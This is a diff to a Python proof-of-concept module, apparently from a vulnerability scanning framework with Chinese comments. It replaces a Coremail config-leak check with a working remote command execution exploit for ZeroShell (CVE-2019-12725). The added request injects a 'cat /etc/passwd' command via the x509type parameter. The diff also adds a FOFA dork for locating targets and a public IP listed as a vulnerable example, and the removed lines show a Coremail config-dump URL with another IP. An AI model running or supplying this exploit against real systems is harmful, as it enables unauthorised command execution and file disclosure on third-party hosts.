@@ -17,19 +17,20 @@ class POC(POCBase):
         略  
         """,                                # POC描述，写更新描述，没有就不写
 
-        "name" : "Coremail 配置信息泄露漏洞",                        # 漏洞名称
-        "VulnID" : "oFx-2021-0001",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
-        "AppName" : "Coremail",                     # 漏洞应用名称
-        "AppVersion" : "",                  # 漏洞应用版本
+        "name" : "ZeroShell 3.9.0 远程命令执行漏洞",                        # 漏洞名称
+        "VulnID" : "CVE-2019-12725",                      # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
+        "AppName" : "ZeroShell防火墙",                     # 漏洞应用名称
+        "AppVersion" : "ZeroShell < 3.9.0",                  # 漏洞应用版本
         "VulnDate" : "2021-06-09",                    # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
         "VulnDesc" : """
-        Coremail 某个接口存在配置信息泄露漏洞，其中存在端口，配置信息等
+            ZeroShell 3.9.0 存在命令执行漏洞，/cgi-bin/kerbynet 页面，
+            x509type 参数过滤不严格，导致攻击者可执行任意命令
         """,                                # 漏洞简要描述
 
         "fofa-dork":"""
-            app="Coremail邮件系统"
+            app="Zeroshell-防火墙"
         """,                     # fofa搜索语句
-        "example" : "http://82.137.200.129/mailsms/s?func=ADMIN:appState&dumpConfig=/",                     # 存在漏洞的演示url，写一个就可以了
+        "example" : "https://185.90.211.170/",                     # 存在漏洞的演示url，写一个就可以了
         "exp_img" : "",                      # 先不管  
     }
 
@@ -42,9 +43,9 @@ class POC(POCBase):
         不存在漏洞：vuln = [False,""]
         """
         vuln = [False,""]
-        url = self.target + "/mailsms/s?func=ADMIN:appState&dumpConfig=/" # url自己按需调整
+        url = self.target + "/cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type=%27%0Acat%20/etc/passwd%0A%27" # url自己按需调整
         
-        flag = """<?xml version="1.0" encoding="UTF-8"?>\n<result>\n<code>S_OK</code>"""
+
         headers = {"User-Agent":get_random_ua(),
                     "Connection":"close",
                     # "Content-Type": "application/x-www-form-urlencoded",
@@ -55,7 +56,7 @@ class POC(POCBase):
             检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
             """
             req = requests.get(url,headers = headers , proxies = self.proxy ,timeout = self.timeout,verify = False)
-            if req.status_code == 200 and flag in req.text:#req.status_code == 200 and :
+            if "root:/root" in req.text:#req.status_code == 200 and :
                 vuln = [True,req.text]
             else:
                 vuln = [False,req.text]
